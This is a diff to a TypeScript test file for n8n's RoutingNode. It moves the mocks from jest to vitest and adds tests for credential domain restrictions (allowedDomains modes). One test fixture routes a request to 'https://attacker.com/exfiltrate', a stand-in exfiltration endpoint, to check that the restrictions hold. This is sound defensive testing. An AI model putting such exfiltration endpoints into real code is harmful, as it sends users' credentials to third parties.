@@ -1,7 +1,7 @@
-import { mock } from 'jest-mock-extended';
 import get from 'lodash/get';
 import type {
 	DeclarativeRestApiSettings,
+	ICredentialDataDecryptedObject,
 	IExecuteData,
 	IExecuteSingleFunctions,
 	IHttpRequestOptions,
@@ -21,6 +21,7 @@ import type {
 } from 'n8n-workflow';
 import { Workflow, createEmptyRunExecutionData } from 'n8n-workflow';
 import type { ICredentialsDecrypted } from 'n8n-workflow/src';
+import { mock } from 'vitest-mock-extended';
 
 import * as executionContexts from '@/execution-engine/node-execution-context';
 import { DirectoryLoader } from '@/nodes-loader';
@@ -2250,9 +2251,11 @@ describe('RoutingNode', () => {
 					itemIndex,
 				);
 
-				jest
-					.spyOn(executionContexts, 'ExecuteSingleContext')
-					.mockReturnValue(executeSingleFunctions);
+				vi.spyOn(executionContexts, 'ExecuteSingleContext').mockImplementation(function (
+					this: executionContexts.ExecuteSingleContext,
+				) {
+					return executeSingleFunctions as never;
+				} as never);
 
 				const numberOfItems = testData.input.specialTestOptions?.numberOfItems ?? 1;
 				if (!inputData.main[0] || inputData.main[0].length !== numberOfItems) {
@@ -2263,7 +2266,7 @@ describe('RoutingNode', () => {
 				}
 
 				const workflowPackage = await import('n8n-workflow');
-				const spy = jest.spyOn(workflowPackage, 'sleep').mockReturnValue(
+				const spy = vi.spyOn(workflowPackage, 'sleep').mockReturnValue(
 					new Promise((resolve) => {
 						resolve();
 					}),
@@ -2425,7 +2428,11 @@ describe('RoutingNode', () => {
 						node,
 						itemIndex + iteration,
 					);
-					jest.spyOn(executionContexts, 'ExecuteSingleContext').mockReturnValue(context);
+					vi.spyOn(executionContexts, 'ExecuteSingleContext').mockImplementation(function (
+						this: executionContexts.ExecuteSingleContext,
+					) {
+						return context as never;
+					} as never);
 					currentItemIndex = context.getItemIndex();
 				}
 
@@ -2434,5 +2441,155 @@ describe('RoutingNode', () => {
 				expect(currentItemIndex).toEqual(expectedItemIndex);
 			});
 		}
+	});
+
+	describe('credential allowedDomains', () => {
+		const mode = 'internal';
+		const runIndex = 0;
+		const itemIndex = 0;
+		const connectionInputData: INodeExecutionData[] = [];
+		const runExecutionData: IRunExecutionData = createEmptyRunExecutionData();
+
+		const baseNode: INode = {
+			parameters: {},
+			name: 'test',
+			type: 'test.set',
+			typeVersion: 1,
+			id: 'uuid-1234',
+			position: [0, 0],
+		};
+
+		const buildNodeType = (): INodeType => {
+			const routingNodeType = nodeTypes.getByNameAndVersion(baseNode.type);
+			routingNodeType.description = {
+				credentials: [{ name: 'testCredential', required: true }],
+				requestDefaults: { baseURL: 'https://api.example.com' },
+				properties: [
+					{
+						displayName: 'Endpoint',
+						name: 'endpoint',
+						type: 'string',
+						default: '',
+						routing: {
+							request: {
+								url: 'https://attacker.com/exfiltrate',
+							},
+						},
+					},
+				],
+			} as unknown as INodeTypeDescription;
+			return routingNodeType;
+		};
+
+		const runWithCredential = async (data: Record<string, unknown>) => {
+			const credentialData = data as unknown as ICredentialDataDecryptedObject;
+			const nodeType = buildNodeType();
+			const workflow = new Workflow({
+				nodes: [baseNode],
+				connections: {},
+				active: false,
+				nodeTypes,
+			});
+
+			const executeFunctions = mock<executionContexts.ExecuteContext>();
+			Object.assign(executeFunctions, {
+				executeData: { data: {}, node: baseNode, source: null } as IExecuteData,
+				inputData: { main: [[{ json: {} }]] } as ITaskDataConnections,
+				runIndex,
+				additionalData,
+				workflow,
+				node: baseNode,
+				mode,
+				connectionInputData,
+				runExecutionData,
+			});
+			executeFunctions.getNodeParameter.mockImplementation(() => ({}));
+
+			const executeSingleFunctions = getExecuteSingleFunctions(
+				workflow,
+				runExecutionData,
+				runIndex,
+				baseNode,
+				itemIndex,
+			);
+			const originalGetNodeParameter = executeSingleFunctions.getNodeParameter;
+			// @ts-expect-error overwriting a method
+			executeSingleFunctions.getNodeParameter = (parameterName: string) =>
+				originalGetNodeParameter(parameterName) ?? {};
+			vi.spyOn(executionContexts, 'ExecuteSingleContext').mockImplementation(function (
+				this: executionContexts.ExecuteSingleContext,
+			) {
+				return executeSingleFunctions as never;
+			} as never);
+
+			const mockCredentials = mock<ICredentialsDecrypted>({
+				id: 'cred-1',
+				name: 'Test Credential',
+				type: 'testCredential',
+				data: credentialData,
+			});
+
+			const routingNode = new RoutingNode(executeFunctions, nodeType, mockCredentials);
+			return await routingNode.runNode();
+		};
+
+		test("propagates credential allowedDomains when mode is 'domains'", async () => {
+			const result = await runWithCredential({
+				apiKey: 'testApiKey',
+				allowedHttpRequestDomains: 'domains',
+				allowedDomains: 'api.example.com',
+			});
+
+			const requestOptions = (result?.[0]?.[0]?.json as { requestOptions: IHttpRequestOptions })
+				.requestOptions;
+			expect(requestOptions.allowedDomains).toBe('api.example.com');
+		});
+
+		test("does not set allowedDomains when mode is 'all'", async () => {
+			const result = await runWithCredential({
+				apiKey: 'testApiKey',
+				allowedHttpRequestDomains: 'all',
+			});
+
+			const requestOptions = (result?.[0]?.[0]?.json as { requestOptions: IHttpRequestOptions })
+				.requestOptions;
+			expect(requestOptions.allowedDomains).toBeUndefined();
+		});
+
+		test("throws when mode is 'none'", async () => {
+			await expect(
+				runWithCredential({
+					apiKey: 'testApiKey',
+					allowedHttpRequestDomains: 'none',
+				}),
+			).rejects.toThrow('This credential is configured to prevent use within an HTTP Request node');
+		});
+
+		test("throws when mode is 'domains' but the list is empty", async () => {
+			await expect(
+				runWithCredential({
+					apiKey: 'testApiKey',
+					allowedHttpRequestDomains: 'domains',
+					allowedDomains: '   ',
+				}),
+			).rejects.toThrow('No allowed domains specified');
+		});
+
+		test("throws when mode is 'domains' but the list is missing", async () => {
+			await expect(
+				runWithCredential({
+					apiKey: 'testApiKey',
+					allowedHttpRequestDomains: 'domains',
+				}),
+			).rejects.toThrow('No allowed domains specified');
+		});
+
+		test('does not set allowedDomains when restriction field is absent', async () => {
+			const result = await runWithCredential({ apiKey: 'testApiKey' });
+
+			const requestOptions = (result?.[0]?.[0]?.json as { requestOptions: IHttpRequestOptions })
+				.requestOptions;
+			expect(requestOptions.allowedDomains).toBeUndefined();
+		});
 	});
 });
